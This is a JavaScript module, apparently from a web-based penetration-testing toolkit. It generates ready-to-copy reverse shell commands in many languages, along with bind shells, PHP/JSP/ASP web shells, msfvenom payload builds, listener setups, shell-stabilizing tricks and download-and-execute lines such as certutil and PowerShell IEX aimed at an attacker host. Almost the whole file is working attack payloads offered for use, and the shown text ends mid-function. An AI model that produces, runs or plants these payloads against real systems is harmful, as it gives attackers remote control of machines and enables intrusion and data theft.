import { esc } from '/js/shared.js';

const RS_SHELLS = [
  { lang: 'Bash', tag: 'bash', variants: [
    { name: 'Bash -i', cmd: (ip,p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
    { name: 'Bash /dev/tcp', cmd: (ip,p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; sh <&196 >&196 2>&196` },
    { name: 'Bash mkfifo', cmd: (ip,p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    { name: 'Bash UDP', cmd: (ip,p) => `sh -i >& /dev/udp/${ip}/${p} 0>&1` },
    { name: 'Bash coproc', cmd: (ip,p) => `coproc bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
  ]},
  { lang: 'Python', tag: 'python', variants: [
    { name: 'Python socket', cmd: (ip,p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { name: 'Python pty', cmd: (ip,p) => `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` },
    { name: 'Python3 socket', cmd: (ip,p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { name: 'Python3 pty', cmd: (ip,p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` },
    { name: 'Python3 short', cmd: (ip,p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` },
  ]},
  { lang: 'PHP', tag: 'php', variants: [
    { name: 'PHP exec', cmd: (ip,p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
    { name: 'PHP shell_exec', cmd: (ip,p) => `php -r '$sock=fsockopen("${ip}",${p});shell_exec("/bin/sh -i <&3 >&3 2>&3");'` },
    { name: 'PHP proc_open', cmd: (ip,p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
    { name: 'PHP passthru', cmd: (ip,p) => `php -r '$sock=fsockopen("${ip}",${p});passthru("/bin/sh -i <&3 >&3 2>&3");'` },
  ]},
  { lang: 'Ruby', tag: 'ruby', variants: [
    { name: 'Ruby socket', cmd: (ip,p) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { name: 'Ruby spawn', cmd: (ip,p) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${p}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444/)?(IO.popen(_,"r"){|io|c.print io.read}):((determine=IO.popen(\'2>&1 \'+_,"r"){|io|c.print io.read}))}'`.replace(/444444/g, 'cd\\s') },
  ]},
  { lang: 'Perl', tag: 'perl', variants: [
    { name: 'Perl socket', cmd: (ip,p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
    { name: 'Perl fork', cmd: (ip,p) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
  ]},
  { lang: 'Netcat', tag: 'netcat', variants: [
    { name: 'nc -e', cmd: (ip,p) => `nc ${ip} ${p} -e /bin/sh` },
    { name: 'nc -c', cmd: (ip,p) => `nc -c /bin/sh ${ip} ${p}` },
    { name: 'nc mkfifo', cmd: (ip,p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    { name: 'nc OpenBSD', cmd: (ip,p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    { name: 'ncat TLS', cmd: (ip,p) => `ncat --ssl ${ip} ${p} -e /bin/sh` },
  ]},
  { lang: 'PowerShell', tag: 'powershell', variants: [
    { name: 'PS TCPClient', cmd: (ip,p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
    { name: 'PS short', cmd: (ip,p) => `powershell -e ${btoa(`$client = New-Object System.Net.Sockets.TCPClient("${ip}",${p});$stream = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $stream.Read($b,0,$b.Length)) -ne 0){$d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r = (iex $d 2>&1|Out-String);$s = $r+"PS "+(pwd).Path+"> ";$sb = ([text.encoding]::ASCII).GetBytes($s);$stream.Write($sb,0,$sb.Length)};$client.Close()`)}` },
    { name: 'PS IEX download', cmd: (ip,p) => `powershell IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${p}/shell.ps1')` },
  ]},
  { lang: 'Java', tag: 'java', variants: [
    { name: 'Java Runtime', cmd: (ip,p) => `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()` },
    { name: 'Java Process', cmd: (ip,p) => `String host="${ip}";\nint port=${p};\nString cmd="/bin/sh";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
  ]},
  { lang: 'Groovy', tag: 'groovy', variants: [
    { name: 'Groovy', cmd: (ip,p) => `String host="${ip}";\nint port=${p};\nString cmd="/bin/bash";\nProcess p=["bash","-c",cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();\np.waitFor()` },
  ]},
  { lang: 'Node.js', tag: 'nodejs', variants: [
    { name: 'Node child_process', cmd: (ip,p) => `require('child_process').exec('bash -i >& /dev/tcp/${ip}/${p} 0>&1')` },
    { name: 'Node net', cmd: (ip,p) => `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();` },
    { name: 'Node.js spawn', cmd: (ip,p) => `var net=require('net');var spawn=require('child_process').spawn;\nvar client=new net.Socket();\nclient.connect(${p},'${ip}');\nclient.on('data',function(d){var sh=spawn('/bin/sh',['-c',d.toString()]);sh.stdout.on('data',function(d){client.write(d)});sh.stderr.on('data',function(d){client.write(d)});});` },
  ]},
  { lang: 'Go', tag: 'go', variants: [
    { name: 'Go', cmd: (ip,p) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go` },
  ]},
  { lang: 'Rust', tag: 'rust', variants: [
    { name: 'Rust', cmd: (ip,p) => `use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd,FromRawFd};\nuse std::process::{Command,Stdio};\nfn main() {\n    let s = TcpStream::connect("${ip}:${p}").unwrap();\n    let fd = s.as_raw_fd();\n    Command::new("/bin/sh").arg("-i")\n        .stdin(unsafe{Stdio::from_raw_fd(fd)})\n        .stdout(unsafe{Stdio::from_raw_fd(fd)})\n        .stderr(unsafe{Stdio::from_raw_fd(fd)})\n        .spawn().unwrap().wait().unwrap();\n}` },
  ]},
  { lang: 'C', tag: 'c', variants: [
    { name: 'C socket', cmd: (ip,p) => `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(){\n    int s=socket(AF_INET,SOCK_STREAM,0);\n    struct sockaddr_in sa={.sin_family=AF_INET,.sin_port=htons(${p})};\n    inet_pton(AF_INET,"${ip}",&sa.sin_addr);\n    connect(s,(struct sockaddr*)&sa,sizeof(sa));\n    dup2(s,0);dup2(s,1);dup2(s,2);\n    execve("/bin/sh",NULL,NULL);\n}` },
  ]},
  { lang: 'Lua', tag: 'lua', variants: [
    { name: 'Lua socket', cmd: (ip,p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
    { name: 'Lua5.1', cmd: (ip,p) => `lua5.1 -e 'local host, port = "${ip}", ${p} local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port) while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'` },
  ]},
  { lang: 'Awk', tag: 'awk', variants: [
    { name: 'Awk', cmd: (ip,p) => `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
  ]},
  { lang: 'Socat', tag: 'socat', variants: [
    { name: 'socat TCP', cmd: (ip,p) => `socat TCP:${ip}:${p} EXEC:/bin/sh` },
    { name: 'socat TTY', cmd: (ip,p) => `socat TCP:${ip}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
    { name: 'socat SSL', cmd: (ip,p) => `socat OPENSSL:${ip}:${p},verify=0 EXEC:/bin/sh` },
  ]},
  { lang: 'xterm', tag: 'xterm', variants: [
    { name: 'xterm', cmd: (ip,p) => `xterm -display ${ip}:1` },
    { name: 'xdotool', cmd: (ip,p) => `DISPLAY=:0 xdotool key --clearmodifiers super; sleep 0.5; xdotool type 'xterm -display ${ip}:1'; xdotool key Return` },
  ]},
  { lang: 'Windows cmd', tag: 'cmd', variants: [
    { name: 'cmd /c ncat', cmd: (ip,p) => `cmd /c ncat ${ip} ${p} -e cmd.exe` },
    { name: 'cmd certutil download', cmd: (ip,p) => `certutil -urlcache -split -f http://${ip}:${p}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe` },
    { name: 'cmd bitsadmin', cmd: (ip,p) => `bitsadmin /transfer shell /download /priority high http://${ip}:${p}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe` },
  ]},
  { lang: 'Telnet', tag: 'telnet', variants: [
    { name: 'Telnet pipe', cmd: (ip,p) => `rm -f /tmp/p; mknod /tmp/p p && telnet ${ip} ${p} 0</tmp/p | /bin/sh 1>/tmp/p` },
    { name: 'Telnet mkfifo', cmd: (ip,p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet ${ip} ${p} >/tmp/f` },
  ]},
  { lang: 'OpenSSL', tag: 'openssl', variants: [
    { name: 'OpenSSL reverse', cmd: (ip,p) => `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${p} > /tmp/s; rm /tmp/s` },
    { name: 'OpenSSL listener', cmd: (ip,p) => `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port ${p}` },
  ]},
  { lang: 'Haskell', tag: 'haskell', variants: [
    { name: 'Haskell', cmd: (ip,p) => `module Main where\nimport System.Process (callCommand)\nmain = callCommand "bash -i >& /dev/tcp/${ip}/${p} 0>&1"` },
  ]},
  { lang: 'Dart', tag: 'dart', variants: [
    { name: 'Dart socket', cmd: (ip,p) => `import 'dart:io';\nimport 'dart:convert';\nmain() {\n  Socket.connect("${ip}", ${p}).then((socket) {\n    socket.listen((data) {\n      Process.start('/bin/sh', ['-i'], environment: {'TERM': 'xterm'})\n        .then((Process p) {\n          p.stdin.add(data);\n          p.stdout.pipe(socket);\n          p.stderr.pipe(socket);\n        });\n    });\n  });\n}` },
  ]},
  { lang: 'msfvenom', tag: 'msfvenom', variants: [
    { name: 'Linux ELF', cmd: (ip,p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f elf > shell.elf` },
    { name: 'Windows EXE', cmd: (ip,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f exe > shell.exe` },
    { name: 'Windows DLL', cmd: (ip,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f dll > shell.dll` },
    { name: 'Java WAR', cmd: (ip,p) => `msfvenom -p java/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f war > shell.war` },
    { name: 'ASP', cmd: (ip,p) => `msfvenom -p windows/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f asp > shell.asp` },
    { name: 'ASPX', cmd: (ip,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f aspx > shell.aspx` },
    { name: 'PHP', cmd: (ip,p) => `msfvenom -p php/reverse_php LHOST=${ip} LPORT=${p} -f raw > shell.php` },
    { name: 'Python', cmd: (ip,p) => `msfvenom -p cmd/unix/reverse_python LHOST=${ip} LPORT=${p} -f raw > shell.py` },
    { name: 'Bash', cmd: (ip,p) => `msfvenom -p cmd/unix/reverse_bash LHOST=${ip} LPORT=${p} -f raw > shell.sh` },
    { name: 'macOS Mach-O', cmd: (ip,p) => `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f macho > shell.macho` },
  ]},
];

const RS_LISTENERS = [
  { name: 'Netcat', cmd: (ip,p) => `nc -lvnp ${p}` },
  { name: 'Netcat (rlwrap)', cmd: (ip,p) => `rlwrap nc -lvnp ${p}` },
  { name: 'Socat', cmd: (ip,p) => `socat file:\`tty\`,raw,echo=0 TCP-L:${p}` },
  { name: 'Socat TTY', cmd: (ip,p) => `socat TCP-LISTEN:${p},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane` },
  { name: 'Socat SSL', cmd: (ip,p) => `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1000 -out cert.pem\nsocat OPENSSL-LISTEN:${p},cert=cert.pem,key=key.pem,verify=0,fork EXEC:/bin/sh` },
  { name: 'pwncat', cmd: (ip,p) => `pwncat -l ${p} -vv` },
  { name: 'Metasploit multi/handler', cmd: (ip,p) => `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${p}; exploit"` },
  { name: 'Metasploit (Meterpreter)', cmd: (ip,p) => `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ${ip}; set LPORT ${p}; exploit"` },
  { name: 'Ncat', cmd: (ip,p) => `ncat -lvnp ${p}` },
  { name: 'Ncat SSL', cmd: (ip,p) => `ncat --ssl -lvnp ${p}` },
];

const RS_STABILIZE = [
  { name: 'Python PTY import', cmd: `python -c 'import pty;pty.spawn("/bin/bash")'`, desc: 'Spawn a proper TTY via Python' },
  { name: 'Python3 PTY import', cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, desc: 'Spawn a proper TTY via Python3' },
  { name: 'script /dev/null', cmd: `script /dev/null -c bash`, desc: 'Use script to get a TTY' },
  { name: 'script -qc (Linux)', cmd: `script -qc /bin/bash /dev/null`, desc: 'Quiet script mode for Linux' },
  { name: 'Background & stty', cmd: `# In reverse shell:\nCtrl+Z\n# In your terminal:\nstty raw -echo; fg\n# Then in shell:\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows <ROWS> columns <COLS>`, desc: 'Full interactive shell via stty' },
  { name: 'stty size (local)', cmd: `stty size`, desc: 'Get your local terminal dimensions' },
  { name: 'socat upgrade', cmd: `# Attacker: socat file:\`tty\`,raw,echo=0 tcp-listen:4444\n# Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444`, desc: 'Upgrade to socat for full TTY' },
  { name: 'rlwrap', cmd: `rlwrap nc -lvnp <PORT>`, desc: 'Wrap listener with readline for history/arrows' },
  { name: 'Set PATH', cmd: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, desc: 'Fix PATH if commands are not found' },
  { name: 'Set TERM', cmd: `export TERM=xterm-256color\nexport SHELL=/bin/bash`, desc: 'Fix terminal type and shell var' },
  { name: 'Spawn with expect', cmd: `/usr/bin/expect -c 'spawn /bin/bash; interact'`, desc: 'Use expect for interactive shell' },
  { name: 'Spawn with perl', cmd: `perl -e 'exec "/bin/bash";'`, desc: 'Perl one-liner to get bash' },
  { name: 'vi/vim escape', cmd: `:set shell=/bin/bash\n:shell`, desc: 'Escape to shell from vi/vim' },
  { name: 'nmap interactive', cmd: `nmap --interactive\n!sh`, desc: 'Old nmap interactive mode (< v5.21)' },
  { name: 'Find writable dirs', cmd: `find / -writable -type d 2>/dev/null`, desc: 'Find directories you can write to' },
];

const RS_FILE_TRANSFERS = [
  { name: 'Python HTTP Server', cmd: `python3 -m http.server 8000`, desc: 'Serve files from current directory' },
  { name: 'wget download', cmd: `wget http://<ATTACKER>:8000/file -O /tmp/file`, desc: 'Download file with wget' },
  { name: 'curl download', cmd: `curl http://<ATTACKER>:8000/file -o /tmp/file`, desc: 'Download file with curl' },
  { name: 'Netcat send', cmd: `# Receiver: nc -lvnp 4444 > file\n# Sender: nc <IP> 4444 < file`, desc: 'Transfer files via netcat' },
  { name: 'Base64 copy', cmd: `# On target: base64 /path/to/file\n# On attacker: echo '<BASE64>' | base64 -d > file`, desc: 'Copy files via base64 encoding' },
  { name: 'SCP', cmd: `scp user@<IP>:/path/file /local/path`, desc: 'Secure copy over SSH' },
  { name: 'PHP download', cmd: `php -r 'file_put_contents("/tmp/file",file_get_contents("http://<ATTACKER>:8000/file"));'`, desc: 'Download with PHP' },
  { name: 'PowerShell download', cmd: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>:8000/file','C:\\Temp\\file')"`, desc: 'Download on Windows with PowerShell' },
  { name: 'certutil download', cmd: `certutil -urlcache -split -f http://<ATTACKER>:8000/file C:\\Temp\\file`, desc: 'Windows certutil download' },
  { name: 'SMB Server', cmd: `# Attacker: impacket-smbserver share . -smb2support\n# Target: copy \\\\<ATTACKER>\\share\\file C:\\Temp\\file`, desc: 'Serve files via SMB' },
];

const RS_BIND_SHELLS = [
  { lang: 'Netcat', cmd: (p) => `nc -lvnp ${p} -e /bin/sh` },
  { lang: 'Netcat mkfifo', cmd: (p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp ${p} >/tmp/f` },
  { lang: 'Python3', cmd: (p) => `python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { lang: 'PHP', cmd: (p) => `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${p});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))die;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){socket_write($cl,fread($cmd,2048),2048);}}'` },
  { lang: 'Perl', cmd: (p) => `perl -e 'use Socket;$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i")'` },
  { lang: 'Ruby', cmd: (p) => `ruby -rsocket -e 'f=TCPServer.new("0.0.0.0",${p});c=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",c.fileno,c.fileno,c.fileno)'` },
  { lang: 'Socat', cmd: (p) => `socat TCP-LISTEN:${p},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane` },
  { lang: 'PowerShell', cmd: (p) => `powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]${p};$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"` },
];

const RS_WEB_SHELLS = [
  { lang: 'PHP simple', cmd: `<?php system($_GET['cmd']); ?>` },
  { lang: 'PHP passthru', cmd: `<?php passthru($_REQUEST['cmd']); ?>` },
  { lang: 'PHP eval', cmd: `<?php eval($_POST['cmd']); ?>` },
  { lang: 'PHP base64', cmd: `<?php eval(base64_decode($_POST['cmd'])); ?>` },
  { lang: 'JSP', cmd: `<%\njava.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();\nint a = -1;\nbyte[] b = new byte[2048];\nwhile((a=in.read(b))!=-1) out.println(new String(b));\n%>` },
  { lang: 'ASP', cmd: `<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set o2 = o.exec("cmd /c " & Request("cmd")) : Response.Write(o2.StdOut.ReadAll) %>` },
  { lang: 'Python (Flask)', cmd: `import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/cmd')\ndef cmd():\n    return os.popen(request.args.get('c','')).read()\napp.run(host='0.0.0.0',port=8080)` },
  { lang: 'Node.js', cmd: `require('http').createServer(function(req,res){\n  require('child_process').exec(\n    require('url').parse(req.url,true).query.cmd,\n    function(e,so,se){res.end(so)}\n  );\n}).listen(8080);` },
];

// PowerShell -EncodedCommand expects Base64 of the UTF-16LE bytes of the script.
function btoa(s) {
  let bin = "";
  for (let i = 0; i < s.length; i++) {
    const cu = s.charCodeAt(i);
    bin += String.fromCharCode(cu & 0xff, (cu >> 8) & 0xff);
  }
  return window.btoa(bin);
}

export function renderReverseShell(container) {
  let ip = '10.10.10.1', port = '4444', filter = '', activeTab = 'generator';

  const style = document.createElement('style');
  style.textContent = `
    .rs-wrap{background:#080c14;color:#c8d6e5;font-family:'Segoe UI',system-ui,sans-serif;padding:0;min-height:100vh}
    .rs-header{background:linear-gradient(135deg,#0a0e17 0%,#141c2e 100%);padding:20px 28px;border-bottom:1px solid #1a2a44}
    .rs-header h2{margin:0;font-size:22px;color:#ff4444;letter-spacing:1px;display:flex;align-items:center;gap:10px}
    .rs-header h2 span{color:#c8d6e5;font-size:13px;font-weight:400;opacity:.7}
    .rs-tabs{display:flex;gap:0;background:#0a0e17;border-bottom:1px solid #1a2a44;padding:0 20px}
    .rs-tab{padding:12px 20px;background:none;border:none;color:#6a8aaa;font-size:13px;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;font-weight:500}
    .rs-tab:hover{color:#c8d6e5;background:rgba(255,255,255,.03)}
    .rs-tab.active{color:#ff4444;border-bottom-color:#ff4444}
    .rs-body{padding:20px 28px}
    .rs-config{display:flex;gap:12px;margin-bottom:20px;align-items:center;flex-wrap:wrap}
    .rs-config label{color:#6a8aaa;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
    .rs-input{background:#0f172a;color:#e2e8f0;border:1px solid #1e293b;padding:8px 14px;border-radius:6px;font-size:14px;font-family:'JetBrains Mono',monospace;outline:none;transition:border-color .2s}
    .rs-input:focus{border-color:#ff4444}
    .rs-input.ip{width:180px}
    .rs-input.port{width:90px}
    .rs-input.filter{flex:1;min-width:180px}
    .rs-grid{display:flex;flex-direction:column;gap:16px}
    .rs-lang-group{border:1px solid #1a2a44;border-radius:8px;overflow:hidden}
    .rs-lang-head{background:#0f172a;padding:10px 16px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
    .rs-lang-head:hover{background:#141c2e}
    .rs-lang-name{font-weight:600;font-size:14px;color:#00aaff;display:flex;align-items:center;gap:8px}
    .rs-lang-tag{font-size:10px;background:rgba(0,170,255,.15);color:#00aaff;padding:2px 8px;border-radius:10px}
    .rs-lang-count{font-size:11px;color:#6a8aaa}
    .rs-variants{display:none;border-top:1px solid #1a2a44}
    .rs-variants.open{display:block}
    .rs-variant{padding:12px 16px;border-bottom:1px solid #111828}
    .rs-variant:last-child{border-bottom:none}
    .rs-variant-name{font-size:12px;color:#00ff88;font-weight:600;margin-bottom:6px}
    .rs-code-wrap{position:relative}
    .rs-code{background:#080c14;border:1px solid #1e293b;border-radius:6px;padding:12px 50px 12px 14px;font-family:'JetBrains Mono','Fira Code',monospace;font-size:12px;color:#e2e8f0;white-space:pre-wrap;word-break:break-all;line-height:1.6;overflow-x:auto;max-height:200px}
    .rs-copy{position:absolute;top:8px;right:8px;background:#1e293b;color:#c8d6e5;border:none;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;transition:all .2s}
    .rs-copy:hover{background:#ff4444;color:#fff}
    .rs-copy.copied{background:#00ff88;color:#000}
    .rs-section{margin-bottom:24px}
    .rs-section h3{color:#00aaff;font-size:16px;margin:0 0 12px;border-bottom:1px solid #1a2a44;padding-bottom:8px}
    .rs-section h4{color:#c8d6e5;font-size:13px;margin:0 0 8px}
    .rs-listener{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px 16px;margin-bottom:10px}
    .rs-listener-name{font-size:13px;color:#ff4444;font-weight:600;margin-bottom:6px}
    .rs-stab{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px 16px;margin-bottom:10px}
    .rs-stab-name{font-size:13px;color:#00ff88;font-weight:600;margin-bottom:4px}
    .rs-stab-desc{font-size:11px;color:#6a8aaa;margin-bottom:8px}
    .rs-encode-area{display:flex;flex-direction:column;gap:12px}
    .rs-textarea{background:#0f172a;color:#e2e8f0;border:1px solid #1e293b;padding:12px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical;min-height:100px;outline:none;width:100%;box-sizing:border-box}
    .rs-textarea:focus{border-color:#ff4444}
    .rs-encode-btns{display:flex;gap:8px;flex-wrap:wrap}
    .rs-btn{background:#1e293b;color:#c8d6e5;border:1px solid #2a3a5a;padding:8px 16px;border-radius:4px;font-size:12px;cursor:pointer;transition:all .2s;font-weight:500}
    .rs-btn:hover{background:#ff4444;color:#fff;border-color:#ff4444}
    .rs-btn.active{background:#ff4444;color:#fff;border-color:#ff4444}
    .rs-info{background:#0f172a;border:1px solid #1a2a44;border-radius:8px;padding:16px;margin-top:12px}
    .rs-info code{background:#080c14;padding:2px 6px;border-radius:3px;font-size:12px;color:#00ff88}
    .rs-warn{background:rgba(255,68,68,.08);border:1px solid rgba(255,68,68,.2);border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:12px;color:#ff8888;line-height:1.6}
    .rs-empty{text-align:center;padding:40px;color:#6a8aaa;font-size:14px}
    @media(max-width:768px){.rs-body{padding:14px}.rs-config{flex-direction:column;align-items:stretch}.rs-input.ip,.rs-input.port,.rs-input.filter{width:100%}}
  `;
  document.head.appendChild(style);

  const tabs = [
    { id: 'generator', label: 'Generator' },
    { id: 'listeners', label: 'Listeners' },
    { id: 'stabilize', label: 'Stabilize' },
    { id: 'encode', label: 'Encode' },
  ];

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
    });
  }

  function renderCodeBlock(code) {
    const wrap = document.createElement('div');
    wrap.className = 'rs-code-wrap';
    const pre = document.createElement('div');
    pre.className = 'rs-code';
    pre.textContent = code;
    const btn = document.createElement('button');
    btn.className = 'rs-copy';
    btn.textContent = 'Copy';
    btn.onclick = () => copyText(code, btn);
    wrap.append(pre, btn);
    return wrap;
  }

  function renderGenerator() {
    const div = document.createElement('div');

    if (window._bridge && window._bridge.connected) {
      const cliInfo = document.createElement('div');
      cliInfo.style.cssText = 'background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:8px;padding:12px 16px;margin-bottom:12px;font-size:12px';
      cliInfo.innerHTML = '<span style="color:#22c55e;font-weight:700">[CLI CONNECTED]</span> <span style="color:#c8d6e5">Detecting available interpreters...</span>';
      div.appendChild(cliInfo);
      (async () => {
